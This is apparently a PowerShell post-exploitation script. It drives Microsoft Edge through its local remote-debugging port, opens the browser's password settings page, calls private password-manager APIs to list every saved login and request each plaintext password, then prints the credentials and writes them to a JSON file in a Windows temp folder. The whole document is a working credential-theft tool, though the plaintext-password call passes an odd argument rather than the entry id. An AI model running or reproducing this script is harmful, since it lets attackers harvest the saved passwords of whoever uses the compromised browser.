$ErrorActionPreference = 'SilentlyContinue'

# Get a page target
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$page = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1

# Connect directly to the PAGE WebSocket (not browser)
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$page.webSocketDebuggerUrl, $ct).Wait()
Write-Output "connected to: $($page.url)"

$buf = [byte[]]::new(10485760)
$script:id = 0

function Eval {
    param([string]$js, [int]$waitSec = 0)
    $script:id++
    $m = @{ id = $script:id; method = "Runtime.evaluate"; params = @{ expression = $js; awaitPromise = $true; returnByValue = $true } }
    $j = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    if ($waitSec -gt 0) { Start-Sleep $waitSec }
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Navigate to settings/passwords
$script:id++
$navM = @{ id = $script:id; method = "Page.navigate"; params = @{ url = "edge://settings/passwords" } }
$navJ = ConvertTo-Json -Compress -InputObject $navM -Depth 5
$navB = [System.Text.Encoding]::UTF8.GetBytes($navJ)
$navS = [ArraySegment[byte]]::new($navB)
$ws.SendAsync($navS, 'Text', $true, $ct).Wait()
Write-Output "navigating to edge://settings/passwords..."

# Wait LONGER for the heavy settings page to fully load
Start-Sleep 20

# Enable Runtime (after navigation, since the context was destroyed)
$null = Eval 'void(0)'

# Wait a bit more
Start-Sleep 5

# Verify URL
$urlR = Eval 'window.location.href'
$urlO = $urlR | ConvertFrom-Json
Write-Output "URL: $($urlO.result.result.value)"

# Check API - BOTH passwordsPrivate and passwordsManagerPrivate
$apiR = Eval 'JSON.stringify({
    pp: !!chrome.passwordsPrivate,
    pmp: !!chrome.passwordsManagerPrivate,
    url: location.href
})'
$apiO = $apiR | ConvertFrom-Json
Write-Output "APIs: $($apiO.result.result.value)"

# Get the saved password list using passwordsManagerPrivate (which has the methods we need)
# Try BOTH callback and promise patterns
Write-Output ""
Write-Output "=== calling getSavedPasswordList ==="

$listR = Eval @'
(async function() {
    try {
        // Edge uses passwordsManagerPrivate for the password manager
        if (typeof chrome.passwordsManagerPrivate !== 'undefined') {
            const api = chrome.passwordsManagerPrivate;
            // Callback pattern
            const list = await new Promise((resolve, reject) => {
                api.getSavedPasswordList(function(entries) {
                    if (chrome.runtime.lastError) {
                        reject(chrome.runtime.lastError.message);
                    } else {
                        resolve(entries);
                    }
                });
            });
            return JSON.stringify({api: "passwordsManagerPrivate", count: list ? list.length : 0, data: list});
        }
        // Chrome pattern
        if (typeof chrome.passwordsPrivate !== 'undefined') {
            const api = chrome.passwordsPrivate;
            const list = await new Promise((resolve, reject) => {
                api.getSavedPasswordList(function(entries) {
                    if (chrome.runtime.lastError) {
                        reject(chrome.runtime.lastError.message);
                    } else {
                        resolve(entries);
                    }
                });
            });
            return JSON.stringify({api: "passwordsPrivate", count: list ? list.length : 0, data: list});
        }
        return JSON.stringify({error: "no password API"});
    } catch(e) {
        return JSON.stringify({error: e.message});
    }
})()
'@ -waitSec 10

$listO = $listR | ConvertFrom-Json
$listV = $listO.result.result.value
Write-Output "list response: $listV"

if ($listV) {
    $listData = $listV | ConvertFrom-Json
    if ($listData.error) {
        Write-Output "ERROR: $($listData.error)"
    } elseif ($listData.count -gt 0) {
        $passwords = $listData.data
        $apiName = $listData.api
        Write-Output "[+] $($listData.count) passwords via $apiName"
        Write-Output ""

        # Extract each password
        $allResults = [System.Collections.ArrayList]::new()

        for ($i = 0; $i -lt $passwords.Count; $i++) {
            $entry = $passwords[$i]
            $eid = $entry.id
            $eurl = if ($entry.urls -and $entry.urls.Count -gt 0) { $entry.urls[0] } else { "unknown" }
            $euser = $entry.username

            Write-Output "[$($i+1)/$($passwords.Count)] $eurl ($euser)..."

            # Get plaintext password
            $getR = Eval @'
(async function() {
    try {
        const apiId = arguments_callee ? 1 : 0;
        const api = chrome.passwordsManagerPrivate || chrome.passwordsPrivate;
        
        // Edge method: requestPlaintextPassword
        if (typeof api.requestPlaintextPassword === 'function') {
            const pw = await new Promise((resolve, reject) => {
                api.requestPlaintextPassword(arguments.length, 0, function(p) {
                    if (chrome.runtime.lastError) reject(chrome.runtime.lastError);
                    else resolve(p);
                });
            });
            return pw;
        }
        // Chrome method: getPlaintextPassword
        if (typeof api.getPlaintextPassword === 'function') {
            const pw = await new Promise((resolve, reject) => {
                api.getPlaintextPassword(arguments.length, function(p) {
                    if (chrome.runtime.lastError) reject(chrome.runtime.lastError);
                    else resolve(p);
                });
            });
            return pw;
        }
        return null;
    } catch(e) {
        return "ERR:" + e.message;
    }
})()
'@ -waitSec 10

            $getO = $getR | ConvertFrom-Json
            $pw = $getO.result.result.value

            if ($pw -and -not $pw.StartsWith("ERR:")) {
                [void]$allResults.Add([PSCustomObject]@{url=$eurl; username=$euser; password=$pw})
                Write-Output "  *** PASSWORD: $pw"
            } else {
                Write-Output "  failed: $pw"
            }
        }

        # Output
        Write-Output ""
        Write-Output "================================================================"
        foreach ($r in $allResults) {
            Write-Output "  $($r.url) | $($r.username) | $($r.password)"
        }
        $allResults | ConvertTo-Json -Depth 3 | Out-File C:\Windows\Temp\ziti\pwd_final_out.json -Encoding utf8
        Write-Output "[+] saved to pwd_final_out.json"
    } else {
        Write-Output "0 passwords"
    }
}

$ws.Dispose()
Write-Output "done"